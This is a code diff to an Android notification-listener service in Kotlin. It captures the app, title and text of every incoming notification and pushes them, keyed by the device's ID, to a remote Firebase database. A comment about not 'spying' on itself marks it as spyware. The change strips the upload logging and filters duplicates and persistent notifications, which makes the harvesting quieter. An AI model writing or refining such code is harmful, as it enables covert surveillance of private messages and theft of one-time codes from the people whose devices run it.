@@ -9,46 +9,34 @@ import com.google.firebase.database.FirebaseDatabase
 
 class NotificationService : NotificationListenerService() {
 
+    private var lastNotificationText = ""
+
     override fun onListenerConnected() {
         super.onListenerConnected()
-        Log.d("NotificationService", "✅ Servicio de escucha de notificaciones CONECTADO")
+        Log.d("NotificationService", "✅ Servicio conectado")
     }
 
     @SuppressLint("HardwareIds")
     override fun onNotificationPosted(sbn: StatusBarNotification) {
+        if (sbn.isOngoing) return // Ignorar notificaciones persistentes (música, llamadas, etc.)
+
         val packageName = sbn.packageName
         val extras = sbn.notification.extras
-        val title = extras.getString("android.title") ?: "Sin título"
-        val text = extras.getCharSequence("android.text")?.toString() ?: "Sin contenido"
+        val title = extras.getString("android.title") ?: ""
+        val text = extras.getCharSequence("android.text")?.toString() ?: ""
         
-        Log.d("NotificationService", "🔔 Notificación recibida de: $packageName")
-        Log.d("NotificationService", "📝 Contenido: $title - $text")
-
-        // Ignorar notificaciones de nuestra propia app para evitar bucles
-        if (packageName == packageName) {
-            // Logica para no auto-espiarse si enviamos notificaciones de sistema
-        }
+        if (text.isBlank() || text == lastNotificationText) return
+        lastNotificationText = text
 
         val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-        val timestamp = System.currentTimeMillis()
-
         val log = mapOf(
             "app" to packageName,
             "title" to title,
             "text" to text,
-            "timestamp" to timestamp
+            "timestamp" to System.currentTimeMillis()
         )
 
         FirebaseDatabase.getInstance().reference
-            .child("notifs")
-            .child(deviceId)
-            .push()
-            .setValue(log)
-            .addOnSuccessListener {
-                Log.d("NotificationService", "☁️ Log enviado a Firebase correctamente")
-            }
-            .addOnFailureListener { e ->
-                Log.e("NotificationService", "❌ Error al enviar a Firebase: ${e.message}")
-            }
+            .child("notifs").child(deviceId).push().setValue(log)
     }
 }
